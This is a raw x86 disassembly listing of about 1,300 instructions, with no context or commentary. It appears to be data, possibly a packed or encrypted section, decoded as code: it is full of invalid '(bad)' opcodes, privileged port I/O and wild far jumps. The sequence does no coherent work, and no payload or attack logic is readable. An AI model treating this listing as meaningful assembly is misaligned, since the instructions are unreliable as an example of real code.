  40acff:	dec    DWORD PTR [ebx]
  40ad01:	inc    ecx
  40ad02:	and    edi,ebp
  40ad04:	arpl   WORD PTR [ebx+0x26700c01],dx
  40ad0a:	fs jmp 0xa1c864d2
  40ad10:	hlt    
  40ad11:	fcmovb st,st(4)
  40ad13:	xor    al,0x25
  40ad15:	and    al,0x66
  40ad17:	gs pop ebp
  40ad19:	add    eax,0x87b9f1fe
  40ad1e:	in     eax,dx
  40ad1f:	into   
  40ad20:	ret    
  40ad21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad22:	fdivr  st,st(5)
  40ad24:	mov    dh,0x1f
  40ad26:	loopne 0x40ad1e
  40ad28:	add    BYTE PTR [ebp+ecx*8-0x359ded9f],dl
  40ad2f:	imul   esi,DWORD PTR [ebp+ecx*2+0x65],0x860e164
  40ad37:	sbb    dl,BYTE PTR [ecx]
  40ad39:	jb     0x40ad63
  40ad3b:	push   eax
  40ad3c:	loopne 0x40ad4e
  40ad3e:	mov    ds:0x5a853672,eax
  40ad43:	xor    edx,ebx
  40ad45:	loope  0x40acca
  40ad47:	cmp    eax,0x16dea161
  40ad4c:	test   ebx,esp
  40ad4e:	in     al,0xa
  40ad50:	sbb    eax,0x61ab4d1b
  40ad55:	daa    
  40ad56:	pop    ebx
  40ad57:	mov    WORD PTR [esi+edx*4-0x6],?
  40ad5b:	mov    DWORD PTR [edi],eax
  40ad5d:	inc    esi
  40ad5e:	shl    BYTE PTR [eax-0x69],0xf
  40ad62:	mov    ecx,esi
  40ad64:	or     esi,DWORD PTR [esi+0x39]
  40ad67:	lds    esi,FWORD PTR [ecx+0x43]
  40ad6a:	xchg   ch,al
  40ad6c:	jle    0x40acf1
  40ad6e:	fs stc 
  40ad70:	pop    ss
  40ad71:	xchg   edi,eax
  40ad72:	mov    dh,0x5d
  40ad74:	dec    ebp
  40ad75:	jne    0x40add6
  40ad77:	add    ebp,DWORD PTR [esi-0x21c1132b]
  40ad7d:	jge    0x40ad43
  40ad7f:	cmp    ebx,ebx
  40ad81:	fisubr WORD PTR fs:[edi+0x6253e96f]
  40ad88:	sub    BYTE PTR [ebx],0x2f
  40ad8b:	imul   ebp,DWORD PTR [edx+0x53],0x63d6a275
  40ad92:	hlt    
  40ad93:	mov    DWORD PTR [edi],0x38a43ca9
  40ad99:	dec    edi
  40ad9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad9b:	(bad)  
  40ad9c:	cmp    eax,0x3f6518ce
  40ada1:	outs   dx,BYTE PTR ds:[esi]
  40ada2:	mov    esi,0xb548ee7d
  40ada7:	or     BYTE PTR [esi+0x1970e072],bl
  40adad:	mov    ecx,0x94f78c2f
  40adb2:	(bad)  
  40adb3:	in     al,0x31
  40adb5:	mov    ecx,0x1cd6a840
  40adba:	(bad)  
  40adbb:	mov    dl,0x40
  40adbd:	and    DWORD PTR [esi],eax
  40adbf:	or     eax,0xe51d276
  40adc4:	mov    al,0x80
  40adc6:	push   es
  40adc7:	imul   ebx,ebx,0xfffffff4
  40adca:	inc    ebp
  40adcb:	call   DWORD PTR [edi-0x75]
  40adce:	cmp    ebp,DWORD PTR [ebx]
  40add0:	js     0x40ae01
  40add2:	data16 mov bh,0xe7
  40add5:	or     BYTE PTR [ebx-0x1f],0x99
  40add9:	dec    eax
  40adda:	jbe    0x40ad9a
  40addc:	retf   
  40addd:	idiv   DWORD PTR [ecx-0xd]
  40ade0:	sub    edx,esi
  40ade2:	jno    0x40adfa
  40ade4:	and    eax,0x32b47b76
  40ade9:	cwde   
  40adea:	mov    eax,0x184d1903
  40adef:	imul   BYTE PTR [esi+eax*4-0x6ee44ffb]
  40adf6:	and    edi,DWORD PTR [ebp+edi*4+0x1e4f99e4]
  40adfd:	out    dx,al
  40adfe:	mov    edx,ds
  40ae00:	dec    edx
  40ae01:	xor    dl,cl
  40ae03:	enter  0x7298,0xcc
  40ae07:	push   ebx
  40ae08:	adc    cl,BYTE PTR [ecx-0x59fa8bea]
  40ae0e:	shl    BYTE PTR [edi],0xca
  40ae11:	inc    ebp
  40ae12:	leave  
  40ae13:	out    0xd,al
  40ae15:	pusha  
  40ae16:	div    BYTE PTR [edx-0x7a]
  40ae19:	sub    BYTE PTR [edi+0x2a75039f],dl
  40ae1f:	fstp   QWORD PTR [edx+0x63231d0e]
  40ae25:	push   0x66378129
  40ae2a:	rol    DWORD PTR [edi-0x5],cl
  40ae2d:	mov    dl,0x57
  40ae2f:	pop    esi
  40ae30:	fdiv   DWORD PTR [edx-0x19]
  40ae33:	mov    ds:0xa0cf712e,al
  40ae38:	popf   
  40ae39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae3a:	sub    ch,BYTE PTR [ebx-0x681d1152]
  40ae40:	jbe    0x40ade6
  40ae42:	aam    0xd3
  40ae44:	and    dl,ch
  40ae46:	dec    ebp
  40ae47:	sub    eax,0xa7c58eeb
  40ae4c:	not    bl
  40ae4e:	push   0x51
  40ae50:	fwait
  40ae51:	jl     0x40ae83
  40ae53:	scas   al,BYTE PTR es:[edi]
  40ae54:	xchg   esp,eax
  40ae55:	ins    DWORD PTR es:[edi],dx
  40ae56:	adc    eax,0x46d06c98
  40ae5b:	addr16 jne 0x40aea7
  40ae5e:	nop
  40ae5f:	cmp    ch,al
  40ae61:	jae    0x40ae97
  40ae63:	pop    ebp
  40ae64:	test   DWORD PTR [esi-0xb],edx
  40ae67:	xor    esp,ebp
  40ae69:	xor    esp,DWORD PTR [ebx]
  40ae6b:	add    ch,al
  40ae6d:	adc    BYTE PTR [ecx],dl
  40ae6f:	pop    ebx
  40ae70:	inc    edi
  40ae71:	xchg   esp,ebp
  40ae73:	test   DWORD PTR [ecx-0x6e86826f],ebp
  40ae79:	sbb    bh,BYTE PTR [edi]
  40ae7b:	jg     0x40aea4
  40ae7d:	test   esp,esp
  40ae7f:	pop    esp
  40ae80:	jae    0x40ae26
  40ae82:	loope  0x40ae7e
  40ae84:	push   ecx
  40ae85:	das    
  40ae86:	inc    DWORD PTR [esi-0x6b]
  40ae89:	ss loopne 0x40ae7c
  40ae8c:	jbe    0x40ae86
  40ae8e:	call   0x704c:0x69b42ef6
  40ae95:	dec    edi
  40ae96:	sub    al,0x3a
  40ae98:	stos   BYTE PTR es:[edi],al
  40ae99:	arpl   WORD PTR [ecx-0x4e954686],si
  40ae9f:	cmp    eax,0x9ed76ca
  40aea4:	jp     0x40aec5
  40aea6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aea7:	repz (bad) 
  40aea9:	push   ecx
  40aeaa:	loop   0x40aefe
  40aeac:	dec    ecx
  40aead:	rol    BYTE PTR [ebx+0x71],0x19
  40aeb1:	and    esi,ebx
  40aeb3:	add    BYTE PTR [eax+0x5e],0x3
  40aeb7:	add    BYTE PTR [edi],cl
  40aeb9:	pop    ebp
  40aeba:	imul   bh
  40aebc:	inc    esi
  40aebd:	mov    ebp,0xda78d2a2
  40aec2:	mov    ah,0x51
  40aec4:	xchg   esi,eax
  40aec5:	bound  esp,QWORD PTR [ecx+0x150f3338]
  40aecb:	or     ecx,DWORD PTR [esi+0x5b28bd56]
  40aed1:	mov    bh,BYTE PTR ds:0x406d1e0b
  40aed7:	push   edx
  40aed8:	bound  edi,QWORD PTR [eiz*8+0x6afc653b]
  40aedf:	repz fs fs mov ecx,0xb1294f54
  40aee7:	test   BYTE PTR [ebp+0x6a],ah
  40aeea:	dec    edx
  40aeeb:	pop    ss
  40aeec:	jmp    0xac5b558b
  40aef1:	mov    edi,0xe7c61fbd
  40aef6:	jne    0x40af17
  40aef8:	xor    BYTE PTR ds:0x4beb,0xc
  40aefe:	sar    DWORD PTR ds:0xead60d00,0xb2
  40af05:	aam    0x5e
  40af07:	sub    BYTE PTR [edi],bh
  40af09:	jne    0x40aedf
  40af0b:	push   esp
  40af0c:	or     eax,0xae6c1510
  40af11:	ror    ebp,0xbc
  40af14:	or     ebp,ebp
  40af16:	adc    al,0xb9
  40af18:	mov    dl,0x28
  40af1a:	inc    eax
  40af1b:	cmp    ch,BYTE PTR [edi]
  40af1d:	fs (bad) 
  40af1f:	mov    ebx,DWORD PTR [eax-0x43569790]
  40af25:	xchg   esp,eax
  40af26:	out    dx,al
  40af27:	cmp    BYTE PTR cs:[ecx+0x6d],bl
  40af2b:	add    ebx,DWORD PTR ds:0xb9a6cbd0
  40af31:	sbb    al,0xac
  40af33:	or     BYTE PTR [esi+0x412c731a],cl
  40af39:	(bad)  
  40af3a:	sahf   
  40af3b:	jmp    0x16e2aaec
  40af40:	es cmp eax,0x439d3aa1
  40af46:	and    ebx,esi
  40af48:	das    
  40af49:	cmp    eax,DWORD PTR cs:[edi-0x3b]
  40af4d:	nop    DWORD PTR [edi+eax*4]
  40af51:	es ss add eax,0x8561914d
  40af58:	add    BYTE PTR [edi],dl
  40af5a:	int3   
  40af5b:	idiv   BYTE PTR [eax]
  40af5d:	adc    eax,DWORD PTR [eax]
  40af5f:	push   ecx
  40af60:	push   0x7b
  40af62:	xor    al,0xb9
  40af64:	stc    
  40af65:	or     DWORD PTR [edi],eax
  40af67:	int    0xb2
  40af69:	je     0x40af4a
  40af6b:	pop    esi
  40af6c:	cld    
  40af6d:	mov    esi,0xe964b140
  40af72:	sbb    al,0x22
  40af74:	xor    DWORD PTR [ebp-0x1ed2bf9],esi
  40af7a:	cmp    eax,DWORD PTR [ebx-0x1]
  40af7d:	dec    edx
  40af7e:	fs push esi
  40af80:	mov    dh,0x20
  40af82:	rol    DWORD PTR [ebp+0x4e],0xde
  40af86:	pushf  
  40af87:	cmp    DWORD PTR [ecx],0x3d34a5e8
  40af8d:	cmp    BYTE PTR [eax],dl
  40af8f:	sbb    BYTE PTR [edx+esi*1-0x341ca708],0x62
  40af97:	in     al,0xef
  40af99:	sub    DWORD PTR [ecx-0x42],ebx
  40af9c:	(bad)  
  40af9d:	mov    ds:0xdd87726e,eax
  40afa2:	mov    dl,0x6e
  40afa4:	mov    dh,0x5f
  40afa6:	jge    0x40af93
  40afa8:	and    ah,BYTE PTR [edi]
  40afaa:	dec    eax
  40afab:	add    edx,DWORD PTR [eax-0x18d7385b]
  40afb1:	imul   esi,DWORD PTR [ebx+0x7d791e9a],0xa20bfae9
  40afbb:	jge    0x40afb7
  40afbd:	mov    eax,ds:0x64bffff4
  40afc2:	jmp    0x7dbe:0xd31ce85e
  40afc9:	mov    eax,ds:0xc34cc43f
  40afce:	jle    0x40aff2
  40afd0:	cs mov gs,ecx
  40afd3:	outs   dx,DWORD PTR ds:[esi]
  40afd4:	int3   
  40afd5:	ret    0xbfab
  40afd8:	mov    edx,0x18a7b316
  40afdd:	xchg   edx,eax
  40afde:	jae    0x40b031
  40afe0:	shl    BYTE PTR [ecx+0x4a3b8c3],cl
  40afe6:	in     eax,dx
  40afe7:	out    dx,al
  40afe8:	or     ebp,DWORD PTR [edx-0x104f9b4f]
  40afee:	sub    cl,BYTE PTR [edi+0x194210a1]
  40aff4:	jmp    0x260d:0x7d67971a
  40affb:	gs test eax,0xaed7190c
  40b001:	imul   ecx,DWORD PTR [esi+ebx*8],0xffffff97
  40b005:	sahf   
  40b006:	call   0x1f0d6a14
  40b00b:	mov    ah,0x42
  40b00d:	mov    bh,0x93
  40b00f:	pop    edi
  40b010:	push   esi
  40b011:	or     eax,0xc661259c
  40b016:	loopne 0x40afb0
  40b018:	jae    0x40b026
  40b01a:	push   cs
  40b01b:	icebp  
  40b01c:	sub    DWORD PTR [edi+edi*4],edi
  40b01f:	pop    ecx
  40b020:	repnz push 0x78
  40b023:	add    al,bh
  40b025:	jns    0x40b01a
  40b027:	jb     0x40b01a
  40b029:	mov    ebx,0xd442891b
  40b02e:	retf   
  40b02f:	push   esp
  40b030:	push   edx
  40b031:	inc    ecx
  40b032:	adc    DWORD PTR [ebx+eiz*8],edi
  40b035:	or     edx,0xffffffc8
  40b038:	cmp    dh,dh
  40b03a:	loopne 0x40afdf
  40b03c:	(bad)  
  40b03e:	add    esi,DWORD PTR [eax]
  40b040:	mov    ecx,0xfde25f50
  40b045:	out    0xdd,al
  40b047:	shr    BYTE PTR [ebp-0x7c],1
  40b04a:	mov    esi,0x908cee5f
  40b04f:	mov    dl,0x8e
  40b051:	cmc    
  40b052:	pusha  
  40b053:	out    dx,eax
  40b054:	sub    eax,0x9b2e156a
  40b059:	aaa    
  40b05a:	(bad)  
  40b05c:	push   0xa8d5fa34
  40b061:	js     0x40b027
  40b063:	mov    ebx,0x291f7b93
  40b068:	stos   DWORD PTR es:[edi],eax
  40b069:	aaa    
  40b06a:	cs sti 
  40b06c:	cwde   
  40b06d:	cld    
  40b06e:	pop    esi
  40b06f:	add    dh,0x8
  40b072:	fwait
  40b073:	jae    0x40b075
  40b075:	add    ch,bh
  40b077:	or     ch,0x8f
  40b07a:	iret   
  40b07b:	and    ebx,DWORD PTR [ecx+0x664990ad]
  40b081:	test   al,0xac
  40b083:	cmp    esi,DWORD PTR [ebx]
  40b085:	add    DWORD PTR [edi-0xcbe1c93],0xffffff82
  40b08c:	push   0xffffff88
  40b08e:	or     bh,dh
  40b090:	mov    cl,0xc9
  40b092:	pop    esi
  40b093:	inc    ebp
  40b094:	xor    cl,0xa5
  40b097:	aaa    
  40b098:	sbb    eax,0x2905081a
  40b09d:	pop    edi
  40b09e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b09f:	in     eax,dx
  40b0a0:	fild   DWORD PTR [ebx]
  40b0a2:	mov    dh,BYTE PTR [esp+esi*2-0xe]
  40b0a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0a7:	mov    gs,WORD PTR [ecx-0x4fae96b5]
  40b0ad:	sub    BYTE PTR [ecx+0x6c1f7332],dl
  40b0b3:	pop    ecx
  40b0b4:	push   ds
  40b0b5:	lock test eax,0x7033e770
  40b0bb:	push   eax
  40b0bc:	xchg   edx,eax
  40b0bd:	cmp    ecx,DWORD PTR [esi]
  40b0bf:	mov    ah,0x7e
  40b0c1:	in     eax,dx
  40b0c2:	or     ebx,DWORD PTR [ecx]
  40b0c4:	mov    cl,0xec
  40b0c6:	cdq    
  40b0c7:	pushf  
  40b0c8:	mov    bl,0x36
  40b0ca:	out    dx,eax
  40b0cb:	and    al,0xdb
  40b0cd:	fs sbb al,0xba
  40b0d0:	out    0xbb,al
  40b0d2:	(bad)  
  40b0d3:	push   0x53
  40b0d5:	inc    esi
  40b0d6:	inc    ebx
  40b0d7:	shr    DWORD PTR [ebx+0x11],cl
  40b0da:	int    0x55
  40b0dc:	aam    0xaf
  40b0de:	les    ebp,FWORD PTR [ecx-0x1b]
  40b0e1:	fwait
  40b0e2:	lds    ebx,FWORD PTR [ebp-0x47]
  40b0e5:	fs das 
  40b0e7:	lea    edx,[edx]
  40b0e9:	jne    0x40b138
  40b0eb:	adc    DWORD PTR ds:0x9915a0ce,edi
  40b0f1:	cmp    DWORD PTR [eax+eiz*2+0x65db8430],esi
  40b0f8:	inc    eax
  40b0f9:	adc    al,0x90
  40b0fb:	xchg   ebx,eax
  40b0fc:	xor    BYTE PTR [ebx+0x2a],dh
  40b0ff:	xlat   BYTE PTR ds:[ebx]
  40b100:	sbb    BYTE PTR [ebx+0x49],ch
  40b103:	(bad)  
  40b104:	xor    DWORD PTR [edx+ebx*4],ecx
  40b107:	and    eax,ebx
  40b109:	mov    ds,esi
  40b10b:	jb     0x40b0aa
  40b10d:	sbb    dh,ch
  40b10f:	out    dx,al
  40b110:	and    edx,DWORD PTR gs:[edx]
  40b113:	call   0x40ee:0x4ac4d14c
  40b11a:	mov    ds:0xc6505893,al
  40b11f:	mov    esi,0xd93935a4
  40b124:	sbb    ch,cl
  40b126:	in     eax,0x82
  40b128:	aaa    
  40b129:	sub    ecx,DWORD PTR [edx+0x6b0d7752]
  40b12f:	nop
  40b130:	int3   
  40b131:	and    edx,DWORD PTR [ecx]
  40b133:	pop    ecx
  40b134:	scas   al,BYTE PTR es:[edi]
  40b135:	int3   
  40b136:	jp     0x40b0be
  40b138:	jbe    0x40b0e5
  40b13a:	jmp    0x2ba4adf1
  40b13f:	test   eax,0x4ee4db8f
  40b144:	leave  
  40b145:	dec    eax
  40b146:	jl     0x40b0f5
  40b148:	or     DWORD PTR [eax-0x14245c5],esp
  40b14e:	cmp    DWORD PTR ds:0x3fbccdc0,ebx
  40b154:	xor    al,0xbf
  40b156:	dec    eax
  40b157:	xor    BYTE PTR [ebp-0x4c],ah
  40b15a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b15b:	or     dl,0x78
  40b15e:	sbb    DWORD PTR [edi],esi
  40b160:	inc    eax
  40b161:	cdq    
  40b162:	shr    DWORD PTR [eax+0x2],0xd3
  40b166:	inc    esp
  40b167:	cmc    
  40b168:	inc    ebp
  40b169:	jmp    0xcf54dd06
  40b16e:	push   eax
  40b16f:	and    bh,BYTE PTR [eax+0x395adad1]
  40b175:	icebp  
  40b176:	ds adc eax,0xfd091ff6
  40b17c:	cmp    dh,BYTE PTR [ebx-0x1e]
  40b17f:	mov    esp,0xd1f5b34f
  40b184:	daa    
  40b185:	cmc    
  40b186:	mov    edi,edi
  40b188:	jbe    0x40b12a
  40b18a:	and    esp,0xffffffe1
  40b18d:	adc    bh,BYTE PTR [esi+0x74]
  40b190:	xchg   ebx,eax
  40b191:	inc    eax
  40b192:	aad    0xb4
  40b194:	icebp  
  40b195:	(bad)  
  40b197:	out    dx,eax
  40b198:	or     al,0x25
  40b19a:	fistp  QWORD PTR gs:[esp+ebx*1+0x25]
  40b19f:	pop    ecx
  40b1a0:	jle    0x40b123
  40b1a2:	and    eax,edi
  40b1a4:	mov    edi,0xd5b381a8
  40b1a9:	fistp  DWORD PTR [eax]
  40b1ab:	xlat   BYTE PTR ds:[ebx]
  40b1ac:	inc    edx
  40b1ad:	jecxz  0x40b192
  40b1af:	jge    0x40b186
  40b1b1:	(bad)
  40b1b4:	or     al,0x85
  40b1b6:	pushf  
  40b1b7:	outs   dx,BYTE PTR ds:[esi]
  40b1b8:	jns    0x40b1c9
  40b1ba:	pop    ebp
  40b1bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1bc:	(bad)  
  40b1bd:	xor    DWORD PTR [esi+ecx*4],edi
  40b1c0:	shl    edx,1
  40b1c2:	inc    esi
  40b1c3:	out    dx,eax
  40b1c4:	nop
  40b1c5:	iret   
  40b1c6:	add    cl,dh
  40b1c8:	fcomp  QWORD PTR ds:0x2c13101f
  40b1ce:	push   cs
  40b1cf:	xchg   DWORD PTR [ebx],ebp
  40b1d1:	push   ebp
  40b1d2:	cs repnz adc al,0x84
  40b1d6:	and    BYTE PTR [eax-0x8],0x9f
  40b1da:	mov    al,ds:0x21e16473
  40b1df:	sub    esp,DWORD PTR [eax+0x522730ae]
  40b1e5:	xchg   DWORD PTR [edx-0x6c],eax
  40b1e8:	jmp    DWORD PTR [edi+edi*2-0x3846aeae]
  40b1ef:	push   ebx
  40b1f0:	jmp    0x6007:0x41c351eb
  40b1f7:	and    bh,bl
  40b1f9:	out    0x55,eax
  40b1fb:	mov    ecx,0xae52ad0e
  40b200:	mov    edx,es
  40b202:	rcl    eax,cl
  40b204:	(bad)  
  40b205:	in     al,0x7f
  40b207:	mov    edx,0xa5a43ffd
  40b20c:	or     eax,DWORD PTR [ebx+0x6]
  40b20f:	mov    DWORD PTR [ebp+0x8402061],ebp
  40b215:	aad    0x31
  40b217:	retf   
  40b218:	pop    ss
  40b219:	addr16 pop esi
  40b21b:	fwait
  40b21c:	push   ds
  40b21d:	les    esi,FWORD PTR [eax]
  40b21f:	out    dx,eax
  40b220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b221:	lods   al,BYTE PTR ds:[esi]
  40b222:	cmp    ebx,0x6c372492
  40b228:	les    edx,FWORD PTR [ecx]
  40b22a:	pop    eax
  40b22b:	or     BYTE PTR [ebp-0x3e6e7728],dh
  40b231:	pushf  
  40b232:	jp     0x40b23a
  40b234:	in     eax,dx
  40b235:	ss jle 0x40b297
  40b238:	ror    DWORD PTR [edi+0x14cdf1a3],1
  40b23e:	inc    esp
  40b23f:	sbb    ebp,DWORD PTR [edi]
  40b241:	dec    ebp
  40b242:	or     dh,dh
  40b244:	ror    DWORD PTR [ebx],cl
  40b246:	test   ebx,0x1e750b27
  40b24c:	xor    eax,0x23244f02
  40b251:	fmul   QWORD PTR [edx]
  40b253:	lock pushf 
  40b255:	push   0x2ab66123
  40b25a:	push   edi
  40b25b:	int    0xe7
  40b25d:	lods   al,BYTE PTR ds:[esi]
  40b25e:	cld    
  40b25f:	xor    BYTE PTR [esi],cl
  40b261:	xlat   BYTE PTR ds:[bx]
  40b263:	pop    esi
  40b264:	(bad)  
  40b265:	pop    ss
  40b266:	add    al,0x52
  40b268:	mov    ecx,esp
  40b26a:	mov    esi,0x88c27d80
  40b26f:	mov    ecx,DWORD PTR [ebp+esi*2-0x48cc9ec]
  40b276:	mov    edi,0x8e7ceca8
  40b27b:	or     al,0xd
  40b27d:	enter  0x453b,0x7
  40b281:	or     al,0x8b
  40b283:	or     BYTE PTR [edx+0x10],ah
  40b286:	mov    ah,0xd2
  40b288:	adc    al,dl
  40b28a:	paddusb mm5,QWORD PTR [ebx-0x29]
  40b28e:	and    cl,BYTE PTR [ebp+0x53]
  40b291:	dec    edx
  40b292:	jecxz  0x40b22d
  40b294:	retf   
  40b295:	fwait
  40b296:	dec    edi
  40b297:	cmp    bh,BYTE PTR [eax]
  40b299:	inc    esi
  40b29a:	fwait
  40b29b:	pop    ecx
  40b29c:	stos   DWORD PTR es:[edi],eax
  40b29d:	mov    esp,0xf0bc1166
  40b2a2:	add    BYTE PTR [edi],0xeb
  40b2a5:	stc    
  40b2a6:	pop    esi
  40b2a7:	xor    BYTE PTR ds:0x7afc491d,dh
  40b2ad:	lock pop ss
  40b2af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2b0:	sbb    esp,DWORD PTR [edi]
  40b2b2:	dec    esp
  40b2b3:	xchg   edx,eax
  40b2b4:	repz test BYTE PTR [edx+0xc],0x2f
  40b2b9:	and    ecx,DWORD PTR [eax]
  40b2bb:	pop    ecx
  40b2bc:	inc    eax
  40b2bd:	fcomp  DWORD PTR [ebx]
  40b2bf:	mov    ds:0xdbf9090f,eax
  40b2c4:	outs   dx,DWORD PTR ds:[esi]
  40b2c5:	push   edx
  40b2c6:	retf   
  40b2c7:	jle    0x40b2b3
  40b2c9:	jl     0x40b2fc
  40b2cb:	cld    
  40b2cc:	pop    edi
  40b2cd:	add    DWORD PTR [edi],eax
  40b2cf:	pusha  
  40b2d0:	mov    DWORD PTR ds:0xc86a1a65,ebx
  40b2d6:	mov    dh,0x85
  40b2d8:	mov    DWORD PTR [ecx-0x339d1086],esp
  40b2de:	cld    
  40b2df:	push   edx
  40b2e0:	call   0x81d1d856
  40b2e5:	sti    
  40b2e6:	inc    esp
  40b2e7:	xchg   edx,eax
  40b2e8:	shl    BYTE PTR [ebx],cl
  40b2ea:	icebp  
  40b2eb:	dec    edx
  40b2ec:	add    bl,dh
  40b2ee:	into   
  40b2ef:	and    ebx,esi
  40b2f1:	push   es
  40b2f2:	(bad)
  40b2f5:	ret    0x6130
  40b2f8:	aad    0xa9
  40b2fa:	sub    bl,bl
  40b2fc:	mov    ah,0xbb
  40b2fe:	arpl   cx,dx
  40b300:	mov    ds:0x292c6313,al
  40b305:	test   DWORD PTR [eax+0x1d],edx
  40b308:	das    
  40b309:	sti    
  40b30a:	jg     0x40b2f1
  40b30c:	mov    edi,0x5821b748
  40b311:	inc    ecx
  40b312:	xchg   edi,eax
  40b313:	call   0x7e0b:0x34a3a9a8
  40b31a:	int    0x68
  40b31c:	call   0x9f90af25
  40b321:	gs in  eax,dx
  40b323:	pop    ds
  40b324:	call   0xb3bf7c97
  40b329:	shl    DWORD PTR [eax+0x56],1
  40b32c:	arpl   WORD PTR [ebx+0x22],bp
  40b32f:	push   0x21
  40b331:	inc    esi
  40b332:	imul   edx,DWORD PTR [ebx],0x77
  40b335:	pop    ss
  40b336:	pop    edx
  40b337:	jmp    0x8d378c64
  40b33c:	xor    eax,DWORD PTR [eax+edi*1]
  40b33f:	mov    esi,0x1dca1258
  40b344:	(bad)  
  40b345:	(bad)  
  40b346:	xchg   ecx,eax
  40b347:	pop    edx
  40b348:	daa    
  40b349:	shl    BYTE PTR [eax+0x69],1
  40b34c:	mov    esi,0x1006bca6
  40b351:	arpl   ax,sp
  40b353:	mov    eax,0x5cc1a0a6
  40b358:	or     edx,DWORD PTR [ebx]
  40b35a:	xor    BYTE PTR [esi-0x54974f3],0xe9
  40b361:	daa    
  40b362:	push   ds
  40b363:	mov    dh,0x81
  40b365:	jne    0x40b363
  40b367:	lds    ebp,FWORD PTR [esi]
  40b369:	jle    0x40b307
  40b36b:	cwde   
  40b36c:	cmp    al,0x8d
  40b36e:	(bad)  
  40b36f:	lock mov esi,0xfb3b3608
  40b375:	dec    edi
  40b376:	push   ebp
  40b377:	(bad)  
  40b378:	pop    ss
  40b379:	stos   BYTE PTR es:[edi],al
  40b37a:	xchg   DWORD PTR [esi-0x3509f439],esi
  40b380:	jae    0x40b335
  40b382:	push   ecx
  40b383:	out    0x1c,al
  40b385:	adc    BYTE PTR [edx+edx*8],0x8e
  40b389:	pop    esp
  40b38a:	jae    0x40b3fb
  40b38c:	loop   0x40b340
  40b38e:	sbb    BYTE PTR [eax+ecx*2-0x567210cb],cl
  40b395:	cmc    
  40b396:	cwde   
  40b397:	shr    ebp,0x58
  40b39a:	out    0x89,eax
  40b39c:	aas    
  40b39d:	adc    edx,ecx
  40b39f:	(bad)  
  40b3a0:	std    
  40b3a1:	add    BYTE PTR [ebp-0x60],ch
  40b3a4:	jmp    0x40b347
  40b3a6:	add    ah,BYTE PTR [eax+0x7e634a24]
  40b3ac:	(bad)  
  40b3ad:	mov    ah,BYTE PTR [edi]
  40b3af:	mov    ebx,0x265895c0
  40b3b4:	mov    ds:0x321c0735,al
  40b3b9:	(bad)  
  40b3ba:	clc    
  40b3bb:	mov    cl,0xf7
  40b3bd:	dec    esp
  40b3be:	fiadd  DWORD PTR [edx]
  40b3c0:	cmp    edi,DWORD PTR [eax+eax*2]
  40b3c3:	shl    DWORD PTR [ecx],1
  40b3c5:	idiv   cl
  40b3c7:	sbb    BYTE PTR [ebx-0x6dbf29af],bl
  40b3cd:	or     eax,0xe1782b92
  40b3d2:	(bad)  
  40b3d3:	lea    esi,[ebx]
  40b3d5:	das    
  40b3d6:	into   
  40b3d7:	pusha  
  40b3d8:	popf   
  40b3d9:	cmp    BYTE PTR [ebp-0x58b1ab7f],ch
  40b3df:	push   edi
  40b3e0:	fistp  DWORD PTR [esi]
  40b3e2:	jb     0x40b452
  40b3e4:	cmp    DWORD PTR [eax+edi*1+0x6028b1],esi
  40b3eb:	fwait
  40b3ec:	push   esp
  40b3ed:	jnp    0x40b3c2
  40b3ef:	imul   esp,DWORD PTR [eax],0xe9c9aac
  40b3f5:	out    dx,al
  40b3f6:	out    dx,al
  40b3f7:	lods   al,BYTE PTR ds:[esi]
  40b3f8:	sahf   
  40b3f9:	cmp    eax,0x63ba6401
  40b3fe:	cmp    esp,DWORD PTR [ecx-0x9c897e0]
  40b404:	pop    edi
  40b405:	out    dx,al
  40b406:	das    
  40b407:	jnp    0x40b445
  40b409:	cdq    
  40b40a:	inc    esi
  40b40b:	sar    BYTE PTR [ecx-0x3ed5b535],cl
  40b411:	rcr    DWORD PTR [ecx],1
  40b413:	inc    edi
  40b414:	mov    esp,0x761923f9
  40b419:	out    dx,al
  40b41a:	jmp    0x28a05530
  40b41f:	mov    esi,0x224ed35c
  40b424:	in     al,dx
  40b425:	or     BYTE PTR [edi+eax*8-0x6e],dh
  40b429:	sahf   
  40b42a:	and    DWORD PTR [ecx],esp
  40b42c:	or     eax,0x19afac89
  40b431:	scas   al,BYTE PTR es:[edi]
  40b432:	mov    al,ds:0xbc7e1fab
  40b437:	dec    edi
  40b438:	xchg   edi,eax
  40b439:	test   eax,0x57e54e9f
  40b43e:	arpl   WORD PTR ds:0x7919b49d,ax
  40b444:	inc    esp
  40b445:	or     bh,cl
  40b447:	(bad)  
  40b448:	int3   
  40b449:	adc    al,BYTE PTR [eax]
  40b44b:	jnp    0x40b40b
  40b44d:	pop    es
  40b44e:	outs   dx,DWORD PTR ds:[esi]
  40b44f:	daa    
  40b450:	out    0xe2,eax
  40b452:	push   ss
  40b453:	jnp    0x40b4ab
  40b455:	cmc    
  40b456:	adc    cl,dh
  40b458:	jns    0x40b40e
  40b45a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b45b:	jp     0x40b481
  40b45d:	cld    
  40b45e:	rcr    edx,cl
  40b460:	test   esi,ebx
  40b462:	in     eax,dx
  40b463:	cld    
  40b464:	mov    al,ds:0x84358aef
  40b469:	xchg   ebx,eax
  40b46a:	xor    DWORD PTR [ecx-0x45],ecx
  40b46d:	or     DWORD PTR [eax+0x48],esp
  40b470:	in     al,0x89
  40b472:	adc    BYTE PTR [ebx],bh
  40b474:	pusha  
  40b475:	retf   0x36f8
  40b478:	push   es
  40b479:	pushf  
  40b47a:	push   ebx
  40b47b:	sbb    esp,DWORD PTR [ecx+edx*4+0x44]
  40b47f:	and    DWORD PTR [esi-0x57681b20],ebx
  40b485:	jnp    0x40b464
  40b487:	push   ebp
  40b488:	imul   edx,DWORD PTR [edx+0x1ecb33d7],0x3ed781a7
  40b492:	mov    al,ds:0xf1ee5873
  40b497:	or     ecx,DWORD PTR [ebp+0x3f]
  40b49a:	adc    eax,0x1d9656cd
  40b49f:	or     al,0x19
  40b4a1:	in     al,dx
